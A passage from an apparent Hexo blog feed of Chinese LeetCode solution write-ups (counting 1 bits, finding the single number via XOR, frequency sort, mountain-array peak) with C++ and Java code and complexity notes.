&lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出 6) 0110011</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;7) &quot;</span> &lt;&lt; bst3[<span class="number">3</span>] &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; bst3[<span class="number">4</span>] &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//输出 7) 0,1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>C&amp;C++</category>
      </categories>
      <tags>
        <tag>notes</tag>
      </tags>
  </entry>
  <entry>
    <title>位1的个数</title>
    <url>/2020/11/25/%E4%BD%8D1%E7%9A%84%E4%B8%AA%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/number-of-1-bits/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>编写一个函数，输入是一个无符号整数（以二进制串的形式），返回其二进制表达式中数字位数为 ‘1’ 的个数（也被称为<a href="https://baike.baidu.com/item/%E6%B1%89%E6%98%8E%E9%87%8D%E9%87%8F">汉明重量</a>）。</p>
<p>提示：</p>
<p>请注意，在某些语言（如 Java）中，没有无符号整数类型。在这种情况下，输入和输出都将被指定为有符号整数类型，并且不应影响您的实现，因为无论整数是有符号的还是无符号的，其内部的二进制表示形式都是相同的。<br>在 Java 中，编译器使用<a href="https://baike.baidu.com/item/%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%A1%A5%E7%A0%81/5295284">二进制补码</a>记法来表示有符号整数。因此，在上面的 示例 3 中，输入表示有符号整数 -3。</p>
<p>进阶：</p>
<p>如果多次调用这个函数，你将如何优化你的算法？</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：00000000000000000000000000001011</span><br><span class="line">输出：3</span><br><span class="line">解释：输入的二进制串 00000000000000000000000000001011 中，共有三位为 &#39;1&#39;。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：00000000000000000000000010000000</span><br><span class="line">输出：1</span><br><span class="line">解释：输入的二进制串 00000000000000000000000010000000 中，共有一位为 &#39;1&#39;。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：11111111111111111111111111111101</span><br><span class="line">输出：31</span><br><span class="line">解释：输入的二进制串 11111111111111111111111111111101 中，共有 31 位为 &#39;1&#39;。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li>输入必须是长度为 <code>32</code> 的 <strong>二进制串</strong> 。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>这道题和以前做的一道题一样，参考<a href="https://z2bns.github.io/2020/11/10/%E6%B1%89%E6%98%8E%E8%B7%9D%E7%A6%BB/">汉明距离</a>，下面给出三种解法，好歹能证明以前那道题咱好好总结了不是😜</p>
<p>①整数转二进制：</p>
<p>题目求二进制表达式中1的个数，我们把整数转二进制，对每位值进行累加。</p>
<p>②与运算按位统计：</p>
<p>每次累加最后一位的值，然后n右移一位。</p>
<p>③与运算1化0：</p>
<p>n&amp;n-1操作可以每次把最后一个1变成0，然后result加1，直到n为0。</p>
<p><strong>方法一：</strong></p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.1M，击败23.65%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">uint32_t</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n)&#123;</span><br><span class="line">            result+=n%<span class="number">2</span>;</span><br><span class="line">            n/=<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>方法二：</strong></p>
<p><strong>c++代码：</strong>(执行用时8ms，击败44.56%，内存消耗6.2M，击败14.35%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">uint32_t</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n)&#123;</span><br><span class="line">            result+=n&amp;<span class="number">1</span>;</span><br><span class="line">            n=n&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>方法三：</strong></p>
<p><strong>c++代码：</strong>(执行用时4ms，击败44.56%，内存消耗6.3M，击败5.30%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">uint32_t</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n)&#123;</span><br><span class="line">            ++result;</span><br><span class="line">            n&amp;=n<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/number-of-1-bits/solution/wei-1de-ge-shu-by-leetcode/">官方题解</a>:</h6><p><strong>方法 1：循环和位移动</strong></p>
<p><strong>算法</strong></p>
<p>这个方法比较直接。我们遍历数字的 32 位。如果某一位是 11 ，将计数器加一。</p>
<p>我们使用 位掩码 来检查数字的第 $i^{th}$位。一开始，掩码 $m=1$因为 $1$的二进制表示是</p>
<script type="math/tex; mode=display">
0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0001</script><p>显然，任何数字跟掩码 $1$ 进行逻辑与运算，都可以让我们获得这个数字的最低位。检查下一位时，我们将掩码左移一位。</p>
<script type="math/tex; mode=display">
0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0000\ 0010</script><p>并重复此过程</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> bits = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> mask = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((n &amp; mask) != <span class="number">0</span>) &#123;</span><br><span class="line">            bits++;</span><br><span class="line">        &#125;</span><br><span class="line">        mask &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bits;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(1)$ 。运行时间依赖于数字 $n$ 的位数。由于这题中 $n$ 是一个 32 位数，所以运行时间是 $O(1)$ 的。</p>
</li>
<li><p>空间复杂度：$O(1)$。没有使用额外空间。</p>
</li>
</ul>
<p><strong>方法 2：位操作的小技巧</strong></p>
<p><strong>算法</strong></p>
<p>我们可以把前面的算法进行优化。我们不再检查数字的每一个位，而是不断把数字最后一个 $1$ 反转，并把答案加一。当数字变成 $0$的时候偶，我们就知道它没有 $1$的位了，此时返回答案。</p>
<p>这里关键的想法是对于任意数字 $n$ ，将 $n$ 和 $n - 1$ 做与运算，会把最后一个 $1$ 的位变成 $0$ 。为什么？考虑 $n$ 和 $n - 1$ 的二进制表示。</p>
<p><img src="/2020/11/25/%E4%BD%8D1%E7%9A%84%E4%B8%AA%E6%95%B0/abfd6109e7482d70d20cb8fc1d632f90eacf1b5e89dfecb2e523da1bcb562f66-image.png" alt="image.png"></p>
<script type="math/tex; mode=display">
图片 1. 将 n和 n-1 做与运算会将最低位的 1 变成 0</script><p>在二进制表示中，数字 $n$ 中最低位的 $1$ 总是对应 $n - 1$ 中的 $0$ 。因此，将 $n$ 和 $n - 1$与运算总是能把 $n$ 中最低位的 $1$ 变成 $0$ ，并保持其他位不变。</p>
<p>使用这个小技巧，代码变得非常简单。</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (n != <span class="number">0</span>) &#123;</span><br><span class="line">        sum++;</span><br><span class="line">        n &amp;= (n - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(1)$。运行时间与 $n$ 中位为 $1$ 的有关。在最坏情况下， $n$ 中所有位都是 $1$ 。对于 32 位整数，运行时间是 $O(1)$ 的。</p>
</li>
<li><p>空间复杂度：$O(1)$。没有使用额外空间。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解的两种方法，也就是我的后两种方法，只不过是用Java实现的。其实用不上特别复杂、高大上的东西，用整数转二进制的这么一个直观的方法效率比另两种方法还高，所以不必一味追求高大上，实用型要高🙃。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>只出现一次的数字</title>
    <url>/2020/11/25/%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/single-number/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。</p>
<p>说明：</p>
<p>你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [2,2,1]</span><br><span class="line">输出: 1</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [4,1,2,1,2]</span><br><span class="line">输出: 4</span><br></pre></td></tr></table></figure>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>题目描述比较短，就是找出非空整数数组中的只出现一次的元素，其它元素出现了两次，思考了一下有多种解法：</p>
<p>①暴力解法：对数组nums升序排序，然后遍历数组判断每个元素是否与下个元素相同，相同步长加2，否则返回不相同的那个元素。复杂度比较高，不满足题目线性时间复杂度。</p>
<p>②桶计数：定义bucket数组存储nums数组中每个元素的出现次数，但是题目没有说明nums中元素的取值范围，也就不知道bucket数组的大小可能需要使用INT_MAX大小，另外也不满足题目的不使用额外空间要求。</p>
<p>③异或运算：仔细读题，除了某个元素只出现一次以外，其余每个元素均出现两次，要求找出那个只出现一次的元素。发现其余元素出现两次这个重点，如果只要找出出现一次的元素，那么对其他元素的出现次数应当没有要求只要满足大于1次就好，而现在给出均出现两次是一个突破口。容易想到两个相同的数异或运算结果是0，而0和任何数异或结果还是任何数。所以只需要遍历nums数组，对每一个元素进行异或操作，最终结果就是那个只出现了一次的元素。</p>
<p><strong>c++代码：</strong>(执行用时40ms，击败49.31%，内存消耗16.9M，击败25.73%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i:nums)&#123;</span><br><span class="line">            result^=i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/single-number/solution/zhi-chu-xian-yi-ci-de-shu-zi-by-leetcode-solution/">官方题解</a>:</h6><p><strong>方法一：位运算</strong><br>如果没有时间复杂度和空间复杂度的限制，这道题有很多种解法，可能的解法有如下几种。</p>
<ul>
<li><p>使用集合存储数字。遍历数组中的每个数字，如果集合中没有该数字，则将该数字加入集合，如果集合中已经有该数字，则将该数字从集合中删除，最后剩下的数字就是只出现一次的数字。</p>
</li>
<li><p>使用哈希表存储每个数字和该数字出现的次数。遍历数组即可得到每个数字出现的次数，并更新哈希表，最后遍历哈希表，得到只出现一次的数字。</p>
</li>
<li><p>使用集合存储数组中出现的所有数字，并计算数组中的元素之和。由于集合保证元素无重复，因此计算集合中的所有元素之和的两倍，即为每个元素出现两次的情况下的元素之和。由于数组中只有一个元素出现一次，其余元素都出现两次，因此用集合中的元素之和的两倍减去数组中的元素之和，剩下的数就是数组中只出现一次的数字。</p>
</li>
</ul>
<p>上述三种解法都需要额外使用 $O(n)$ 的空间，其中 $n$ 是数组长度。如果要求使用线性时间复杂度和常数空间复杂度，上述三种解法显然都不满足要求。那么，如何才能做到线性时间复杂度和常数空间复杂度呢？</p>
<p>答案是使用位运算。对于这道题，可使用异或运算 $\oplus$。异或运算有以下三个性质。</p>
<ol>
<li>任何数和 $0$ 做异或运算，结果仍然是原来的数，即 $a \oplus 0=a$。</li>
<li>任何数和其自身做异或运算，结果是$0$，即 $a \oplus a=0$。</li>
<li>异或运算满足交换律和结合律，即 $a \oplus b \oplus a=b \oplus a \oplus a=b \oplus (a \oplus a)=b \oplus0=b$。</li>
</ol>
<p><img src="/2020/11/25/%E5%8F%AA%E5%87%BA%E7%8E%B0%E4%B8%80%E6%AC%A1%E7%9A%84%E6%95%B0%E5%AD%97/3.PNG" alt="img"></p>
<p>假设数组中有 $2m+1$ 个数，其中有 $m$ 个数各出现两次，一个数出现一次。令 $a_{1}$、$a_{2}$ 、$\ldots…、a_{m}$为出现两次的 $m$ 个数，$a_{m+1}$ 为出现一次的数。根据性质 3，数组中的全部元素的异或运算结果总是可以写成如下形式：</p>
<script type="math/tex; mode=display">
(a_{1} \oplus a_{1}) \oplus (a_{2} \oplus a_{2}) \oplus \cdots \oplus (a_{m} \oplus a_{m}) \oplus a_{m+1}</script><p>根据性质 2 和性质 1，上式可化简和计算得到如下结果：</p>
<script type="math/tex; mode=display">
0 \oplus 0 \oplus \cdots \oplus 0 \oplus a_{m+1}=a_{m+1}</script><p>因此，数组中的全部元素的异或运算结果即为数组中只出现一次的数字。</p>
<p><strong>c++代码：</strong>(执行用时40ms，击败49.31%，内存消耗16.9M，击败25.73%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> e: nums) ret ^= e;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 是数组长度。只需要对数组遍历一次。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解有视频题解，上面我只记录了文字题解，没啥说的好吧，已经越来越好了，和官方题解采用一样的方法（也许只有这一种满足条件的方法），😕。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>按照频率将数组升序排序</title>
    <url>/2020/11/25/%E6%8C%89%E7%85%A7%E9%A2%91%E7%8E%87%E5%B0%86%E6%95%B0%E7%BB%84%E5%8D%87%E5%BA%8F%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/sort-array-by-increasing-frequency/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数数组 <code>nums</code> ，请你将数组按照每个值的频率 <strong>升序</strong> 排序。如果有多个值的频率相同，请你按照数值本身将它们 <strong>降序</strong> 排序。 </p>
<p>请你返回排序后的数组。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,1,2,2,2,3]</span><br><span class="line">输出：[3,1,1,2,2,2]</span><br><span class="line">解释：&#39;3&#39; 频率为 1，&#39;1&#39; 频率为 2，&#39;2&#39; 频率为 3 。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [2,3,1,3,2]</span><br><span class="line">输出：[1,3,3,2,2]</span><br><span class="line">解释：&#39;2&#39; 和 &#39;3&#39; 频率都为 2 ，所以它们之间按照数值本身降序排序。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [-1,1,-6,4,5,-6,1,4,1]</span><br><span class="line">输出：[5,-1,4,4,-6,-6,1,1,1]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 100</code></li>
<li><code>-100 &lt;= nums[i] &lt;= 100</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>使用桶排序，定义一个大小为201的bucket数组初始化为0，桶中第i个元素的值是nums中值为i的元素个数，也就是说nums数组中有多少个取值，bucket数组大小就为多少，注意<code>-100&lt;=nums[i]&lt;=100</code>,所以桶的大小是201。接下来修改sort排序规则，对nums数组按照值得频率升序、数值本身降序排序。</p>
<p><strong>c++代码：</strong>(执行用时16ms，击败71.08%，内存消耗11.2M，击败92.67%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">frequencySort</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//桶排序</span></span><br><span class="line">        <span class="keyword">int</span> bucket[<span class="number">201</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i:nums)&#123;</span><br><span class="line">            ++bucket[<span class="number">100</span>+i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//修改排序规则，第三个表达式是Lambda表达式，可以作为inline函数使用</span></span><br><span class="line">        sort(nums.begin(), nums.end(), [=](<span class="keyword">int</span> &amp; a, <span class="keyword">int</span> &amp; b) &#123;</span><br><span class="line">            <span class="keyword">return</span> (bucket[<span class="number">100</span>+a]&lt;bucket[<span class="number">100</span>+b] || bucket[<span class="number">100</span>+a]== bucket[<span class="number">100</span>+b] &amp;&amp; a&gt;b);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，我觉得我这个应该差不多是最优解法了吧，效率还挺高的。昨天正在看《C++标准库 第二版》这本书，刚好看完Lambda表达式，今天就用上了😛，真好，以前遇到sort自定义规则排序的我都没好好看，现在已经会使用了。赶快把《C++标准库 第二版》还有《STL源码剖析》这两本书给看完，看完以后对中等题和难题也有信心了😊。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>山脉数组的峰顶索引</title>
    <url>/2020/11/26/%E5%B1%B1%E8%84%89%E6%95%B0%E7%BB%84%E7%9A%84%E5%B3%B0%E9%A1%B6%E7%B4%A2%E5%BC%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/peak-index-in-a-mountain-array/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>我们把符合下列属性的数组 A 称作山脉：</p>
<ul>
<li><code>A.length &gt;= 3</code></li>
<li>存在 <code>0 &lt; i &lt; A.length - 1</code> 使得<code>A[0] &lt; A[1] &lt; ... A[i-1] &lt; A[i] &gt; A[i+1] &gt; ... &gt; A[A.length - 1]</code></li>
</ul>
<p>给定一个确定为山脉的数组，返回任何满足 <code>A[0] &lt; A[1] &lt; ... A[i-1] &lt; A[i] &gt; A[i+1] &gt; ... &gt; A[A.length - 1]</code> 的 <code>i</code> 的值。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[0,1,0]</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[0,2,1,0]</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li><code>3 &lt;= A.length &lt;= 10000</code></li>
<li>0 &lt;= A[i] &lt;= 10^6</li>
<li>A 是如上定义的山脉</li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>山脉数组前半部分是递增的后半部分是递减的，就是要求出中间的那个最大的元素下标。</p>
<p>遍历数组，返回第一个元素值大于下个元素值的元素的下标。</p>
<p><strong>c++代码：</strong>(执行用时20ms，击败86.50%，内存消耗11.8M，击败6.80%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">peakIndexInMountainArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=arr.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(arr[i]&gt;arr[i+<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//其实根据题目要求输入一定是山脉数组，所以for循环中一定会会返回i，但是对整个程序而言有其它输入（不满足题意）会导致for循环不返回，所以要用下面return语句保证编译通过（保证返回一个整数）。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

